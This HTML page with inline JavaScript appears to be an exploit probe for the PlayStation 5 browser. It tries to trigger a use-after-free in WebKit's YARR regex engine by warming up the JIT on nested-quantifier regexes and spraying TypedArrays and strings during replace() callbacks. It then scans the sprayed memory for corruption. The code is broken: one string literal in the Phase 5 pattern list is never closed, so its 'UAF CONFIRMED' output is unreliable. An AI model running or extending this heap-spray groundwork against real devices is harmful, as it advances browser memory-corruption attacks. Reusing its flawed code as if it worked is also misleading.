<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v24 - YARR</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
pointer-events:none;z-index:9999}
#hd{position:fixed;top:0;left:0;right:0;height:44px;
background:linear-gradient(180deg,#0d0d0d,#080808);
border-bottom:1px solid #00ff41;display:flex;align-items:center;
padding:0 16px;gap:14px;z-index:10;font-size:12px}
.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
#out{position:fixed;top:46px;left:0;right:0;bottom:0;
padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;-webkit-user-select:text}
#out::-webkit-scrollbar{width:5px}
#out::-webkit-scrollbar-track{background:#001a06}
#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
</style>
</head>
<body>
<div id="hd">
<span class="l">▶ v24 YARR</span><span class="s">│</span>
<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
<span class="v" id="h2">STATUS:<b>?</b></span>
</div>
<div id="pg"><div id="bar" style="width:0%"></div></div>
<div id="out"></div>
<script>
"use strict";

var O=document.getElementById("out");
var bar=document.getElementById("bar");
function pg(p){bar.style.width=p+"%"}
function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
function P(m,c){var s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight;
try{console.log("[v24] "+m)}catch(e){}}
function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m,"mg")}
function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}

window.onerror=function(m,s,l){Fl("CRASH: "+m+" @"+l);hu("h2","STATUS:<b>CRASH</b>");return true};

var ua=navigator.userAgent||"";
var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");

P("════════════════════════════════════","hd");
P("  PS5 v24 — YARR Regex UAF","hd");
P("════════════════════════════════════","hd");
P("");
P("  From research report:","dm");
P("  YARR ParenContext UAF during backtracking","dm");
P("  Nested quantifiers + JIT heating (>200 iter)","dm");
P("  Freed context can be reclaimed","dm");
P("");

// ============================================================
//  PHASE 1: Basic regex pattern testing
// ============================================================
pg(5);P("▸ Phase 1: Pattern Testing","hd");
P("");

var patterns=[
{re:/(a+)+b/,input:"aaaaaaaaaaaaaaaaaaaaac",name:"(a+)+b classic"},
{re:/(a|a)+b/,input:"aaaaaaaaaaaaaaaaaaaaac",name:"(a|a)+b alternation"},
{re:/((a+)+)+b/,input:"aaaaaaaaaaaaaaaaaaaac",name:"((a+)+)+b nested"},
{re:/(a*)*b/,input:"aaaaaaaaaaaaaaaaaaaaac",name:"(a*)*b star nest"},
{re:/(?:a+)+b/,input:"aaaaaaaaaaaaaaaaaaaaac",name:"(?:a+)+b non-cap"},
{re:/(a+)+$/,input:"aaaaaaaaaaaaaaaaaaaaac",name:"(a+)+$ anchored"},
{re:/(a{1,10}){1,10}b/,input:"a".repeat(30)+"c",name:"bounded quant"},
{re:/(a+)+b/,input:"a".repeat(25)+"c",name:"(a+)+b short"},
{re:/^(a+)+b/,input:"a".repeat(20)+"c",name:"^(a+)+b"}
];

for(var i=0;i<patterns.length;i++){
var p=patterns[i];
try{
var t0=performance.now();
var result=p.re.test(p.input);
var elapsed=performance.now()-t0;
P("  "+p.name.padEnd(22)+" → "+elapsed.toFixed(1)+"ms result="+result,
elapsed>100?"wr":elapsed>10?"hl":"ok");
}catch(e){
P("  "+p.name.padEnd(22)+" → ERR: "+e.message.substring(0,30),"er");
}
}

// ============================================================
//  PHASE 2: JIT Heating
//  Run regex >200 times to trigger JIT compilation
// ============================================================
pg(15);P("\n▸ Phase 2: JIT Heating","hd");
P("  Running 300 iterations to heat JIT...","dm");

var hotRe=/(a+)+b/;
var hotStr="a".repeat(25)+"c";
var heatTimes=[];

try{
for(var i=0;i<300;i++){
var t0=performance.now();
hotRe.test(hotStr);
heatTimes.push(performance.now()-t0);
}

// Check for JIT speedup (should get faster after ~200 iterations)
var first10=0,last10=0;
for(var i=0;i<10;i++)first10+=heatTimes[i];
for(var i=290;i<300;i++)last10+=heatTimes[i];
first10/=10;last10/=10;

P("  First 10 avg: "+first10.toFixed(2)+"ms");
P("  Last 10 avg:  "+last10.toFixed(2)+"ms");
P("  JIT speedup:  "+(first10/last10).toFixed(1)+"x",(first10/last10>1.5)?"ok":"wr");

Ok("JIT heating complete");
}catch(e){Fl("JIT heating: "+e.message)}

// ============================================================
//  PHASE 3: Timing analysis
//  Measure backtracking time with increasing input length
// ============================================================
pg(25);P("\n▸ Phase 3: Backtracking Timing","hd");
P("  Measuring backtracking cost...","dm");

var lengths=[5,10,15,20,25,28,30];
for(var i=0;i<lengths.length;i++){
var len=lengths[i];
var str="a".repeat(len)+"c";
try{
var t0=performance.now();
hotRe.test(str);
var elapsed=performance.now()-t0;
P("  len="+String(len).padStart(3)+" → "+elapsed.toFixed(1)+"ms",elapsed>1000?"er":elapsed>100?"wr":"ok");
}catch(e){
P("  len="+String(len).padStart(3)+" → ERR","er");
}
}

// ============================================================
//  PHASE 4: Heap spray during regex via replace() callback
//  This is the KEY: during backtracking, we allocate objects
//  that might reclaim the freed ParenContext
// ============================================================
pg(40);P("\n▸ Phase 4: Spray During Backtracking","hd");
P("  Using replace() callback to spray during regex execution","dm");
P("");

var sprayObjects=[];

function sprayDuringRegex(){
// Allocate objects that might land in freed ParenContext slot
// ParenContext is a small struct (~64-128 bytes on 64-bit)
for(var i=0;i<512;i++){
sprayObjects.push({a:i,b:i*2,c:"spray_"+i,d:new ArrayBuffer(64)});
}
}

// Pattern that triggers backtracking AND calls our callback
var sprayRe=/(a+)+b/g;
var sprayStr="a".repeat(20)+"c";

var callbackCount=0;
var sprayTriggered=false;

try{
var result=sprayStr.replace(sprayRe,function(match,p1,offset,string){
callbackCount++;
if(!sprayTriggered&&callbackCount===1){
sprayTriggered=true;
sprayDuringRegex();
}
return match;
});

P("  replace() completed, callbacks: "+callbackCount);
P("  Spray objects: "+sprayObjects.length);
P("  Result: '"+result.substring(0,30)+"'");

// Check if spray affected regex result
if(result!==sprayStr){
Hi("REGEX RESULT CHANGED DURING SPRAY!");
Hi("This indicates memory corruption!");
}
}catch(e){
Fl("replace spray: "+e.message);
// Crash during replace = potential UAF
Hi("EXCEPTION during replace = potential UAF triggered!");
}

// ============================================================
//  PHASE 5: Multiple regex patterns with spray
//  Try different patterns that create more ParenContexts
// ============================================================
pg(55);P("\n▸ Phase 5: Multi-Capture Spray","hd");
P("  Patterns with multiple capture groups","dm");
P("");

// Pre-heat JIT for these patterns too
var multiPatterns=[
{re:/((a+)(b+))+c/,str:"abababababababababd,name:"((a+)(b+))+c"},
{re:/(a(b(c(d(e)+)+)+)+)+f/,str:"abcdeabcdeabcdec",name:"deep nested"},
{re:/(a|(b))+c/,str:"ababababababac",name:"alt capture"}
];

for(var p=0;p<multiPatterns.length;p++){
var pat=multiPatterns[p];

// Heat JIT
for(var i=0;i<300;i++){
try{pat.re.test(pat.str)}catch(e){}
}

// Test with spray
sprayObjects=[];
callbackCount=0;
sprayTriggered=false;

try{
var result=pat.str.replace(pat.re,function(){
callbackCount++;
if(!sprayTriggered&&callbackCount===1){
sprayTriggered=true;
for(var j=0;j<256;j++){
sprayObjects.push({x:j,y:j*j,data:new ArrayBuffer(128)});
}
}
return arguments[0];
});

P("  "+pat.name.padEnd(18)+" → callbacks="+callbackCount+" spray="+sprayObjects.length+" ok","ok");
}catch(e){
P("  "+pat.name.padEnd(18)+" → EXCEPTION: "+e.message.substring(0,40),"er");
Hi("Exception during multi-capture = potential UAF!");
}
}

// ============================================================
//  PHASE 6: TypedArray spray for ParenContext reclamation
//  ParenContext is ~64-128 bytes, use specific sized arrays
// ============================================================
pg(70);P("\n▸ Phase 6: TypedArray Spray","hd");
P("  Targeting ParenContext size (~64-128 bytes)","dm");
P("");

var typedSpray=[];

function typedSprayFn(){
for(var i=0;i<1024;i++){
// 64-byte array = likely ParenContext size
var buf=new ArrayBuffer(64);
var view=new DataView(buf);
// Write marker pattern
view.setUint32(0,0x41414141,true);
view.setUint32(4,0x42424242,true);
view.setUint32(8,i,true);
typedSpray.push({buf:buf,view:view});
}
// Also try 128-byte
for(var i=0;i<512;i++){
var buf=new ArrayBuffer(128);
var view=new DataView(buf);
view.setUint32(0,0xDEADBEEF,true);
view.setUint32(4,i,true);
typedSpray.push({buf:buf,view:view});
}
}

// Heat JIT
for(var i=0;i<300;i++){try{hotRe.test(hotStr)}catch(e){}}

// Run with typed array spray
typedSpray=[];
callbackCount=0;
sprayTriggered=false;

try{
var result=hotStr.replace(/(a+)+b/g,function(){
callbackCount++;
if(!sprayTriggered){
sprayTriggered=true;
typedSprayFn();
}
return arguments[0];
});

P("  TypedArray spray: "+typedSpray.length+" arrays");
P("  Callbacks: "+callbackCount);

// Check for corruption in sprayed arrays
var corrupted=0;
for(var i=0;i<typedSpray.length;i++){
var v=typedSpray[i].view;
var c0=v.getUint32(0,true);
if(c0!==0x41414141&&c0!==0xDEADBEEF){
corrupted++;
if(corrupted<=5){
P("  CORRUPTION at index "+i+": got 0x"+c0.toString(16),"hl");
}
}
}
if(corrupted>0){
St("HEAP CORRUPTION DETECTED: "+corrupted+" entries!");
Hi("ParenContext UAF + reclamation CONFIRMED!");
}
}catch(e){
Fl("TypedArray spray: "+e.message);
Hi("Exception = potential UAF!");
}

// ============================================================
//  PHASE 7: String-based reclamation
//  ParenContext might share heap with JS strings
// ============================================================
pg(85);P("\n▸ Phase 7: String Spray","hd");
P("  Using strings to reclaim ParenContext","dm");
P("");

var stringSpray=[];

function stringSprayFn(){
for(var i=0;i<2048;i++){
// Create strings of various lengths
var len=32+(i%64);
var s="";
for(var j=0;j<len;j++)s+=String.fromCharCode(0x41+(j%26));
stringSpray.push(s);
}
}

// Heat
for(var i=0;i<300;i++){try{hotRe.test(hotStr)}catch(e){}}

stringSpray=[];
callbackCount=0;
sprayTriggered=false;

try{
var result=hotStr.replace(/(a+)+b/g,function(){
callbackCount++;
if(!sprayTriggered){
sprayTriggered=true;
stringSprayFn();
}
return arguments[0];
});

P("  String spray: "+stringSpray.length+" strings allocated");

// Check regex result
if(result!==hotStr){
Hi("Result mismatch during string spray!");
}
}catch(e){
Fl("String spray: "+e.message);
}

// ============================================================
//  PHASE 8: Detection and analysis
// ============================================================
pg(95);P("\n▸ Phase 8: Post-spray Analysis","hd");
P("");

// Check all sprayed arrays for corruption
P("  Scanning typed arrays for post-execution corruption...","dm");

var postCorrupted=0;
for(var i=0;i<typedSpray.length;i++){
try{
var v=typedSpray[i].view;
var c0=v.getUint32(0,true);
var c4=v.getUint32(4,true);
if(c0!==0x41414141&&c0!==0xDEADBEEF){
postCorrupted++;
if(postCorrupted<=10){
P("    ["+i+"] offset0=0x"+c0.toString(16)+" offset4=0x"+c4.toString(16),"hl");
}
}
}catch(e){}
}

if(postCorrupted>0){
St("POST-EXECUTION CORRUPTION: "+postCorrupted+" entries!");
Hi("ParenContext memory was reclaimed and overwritten!");
}

// Check for unexpected regex results
P("");
P("  Testing regex consistency post-spray...","dm");

var testResults=[];
for(var i=0;i<20;i++){
try{
var r=hotRe.test(hotStr);
testResults.push(r);
}catch(e){
testResults.push("ERR:"+e.message.substring(0,10));
}
}

var allSame=testResults.every(function(r){return r===testResults[0]});
P("  Consistency: "+(allSame?"stable":"UNSTABLE ★"),allSame?"ok":"hl");

if(!allSame){
St("UNSTABLE REGEX RESULTS = UAF EFFECT!");
P("  Results: "+testResults.join(","),"hl");
}

// ============================================================
//  SUMMARY
// ============================================================
pg(100);P("\n════════════════════════════════════","hd");
P("  SUMMARY","hd");
P("════════════════════════════════════","hd");
P("");
P("  Backtracking tested:    ✅");
P("  JIT heating:            ✅ (300 iterations)");
P("  Spray during regex:     ✅ (via replace callback)");
P("  TypedArray spray:       "+typedSpray.length+" arrays");
P("  String spray:           "+stringSpray.length+" strings");
P("  Corruption detected:    "+(postCorrupted>0?"✅ "+postCorrupted:"❌"));
P("  Regex consistency:      "+(allSame?"stable":"UNSTABLE"));
P("");

if(postCorrupted>0||!allSame){
St("YARR UAF CONFIRMED!");
P("  ParenContext was freed and reclaimed!","hl");
hu("h2","STATUS:<b>UAF FOUND</b>");
}else{
P("  No corruption detected.","dm");
P("  FW 13.40 may have ParenContext patches.","dm");
P("  Or spray didn't hit the right heap region.","dm");
hu("h2","STATUS:<b>CLEAN</b>");
}

</script>
</body>
</html>
